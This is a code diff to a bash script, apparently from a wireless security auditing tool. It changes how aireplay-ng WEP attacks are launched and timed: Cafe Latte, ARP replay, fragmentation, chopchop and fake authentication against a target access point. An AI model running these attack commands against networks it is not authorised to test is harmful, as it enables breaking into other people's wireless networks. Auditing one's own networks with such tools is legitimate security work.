@@ -69,10 +69,12 @@ wep_attacks(){
     attack=$1; shift;
 	hardclean replay_dec-*.xor
     [[ $attack != menu ]] && { 
-		capture &
+		export time_=0;
+		capture
 	 }
+	export time_=1
     wep_attacks_$attack $@
-	notification="Attack launched, see window menu"
+	notification=$attack_notification
     $clear;
 }
 interactive_wep(){
@@ -86,34 +88,39 @@ interactive_wep(){
 
 
 wep_attacks_caffelate(){
+	time_=1
+	export wait_for_execute=0;
 	execute  $"Cafe Latte Attack on: $Host_SSID "\
 	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
 		$INJECTRATE -D $iwifi & 
-
-	read -p "$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi"
-	auth_attacks_fake 
+	auth_attacks_fake
 }
 
 wep_attacks_arpreplay_interactive(){
 	FT_="0841"; INJMAC_="FF:FF:FF:FF:FF:FF"; interactive_wep;
 
     if [[ $directed == 1 ]]; then
+		time_=1;
 		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
 	else
-		auth_attacks_fake 1 &
+		time_=1;
 		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
+		auth_attacks_fake 1
 	fi
 }
 
 wep_attacks_fragmentation(){
-    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-    killall -9 airodump-ng aireplay-ng
     if [[ $directed != 1 ]]; then
-		auth_attacks_fake &
+		time_=1;
+		auth_attacks_fake 
+		tail_launched=1
         export wait_for_execute=1; execute $"Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
             $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi 
+
 		wait_for_execute=0;
     else
+		time_=1;
+		tail_launched=1
         wait_for_execute=1; execute $"Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
             -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi  
 		wait_for_execute=0;
@@ -126,12 +133,14 @@ wep_attacks_chopchop(){
 	hardclean replay_dec-*.xor
 
 	[[ $directed != 1 ]] && {
-		auth_attacks_fake &
+		auth_attacks_fake
+		tail_launched=1
 		export wait_for_execute=1; execute $"Chopchoping at $Host_SSID"\
 			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi  
 		export wait_for_execute=0;
 	} || {
 		export wait_for_execute=1; 
+		tail_launched=1
 		execute $"Directed ChopChoping to $Client_MAC at $Host_SSID"\
 			$AIREPLAY  --chopchop -b $Host_MAC -h $Client_MAC $iwifi 
 		export wait_for_execute=0;
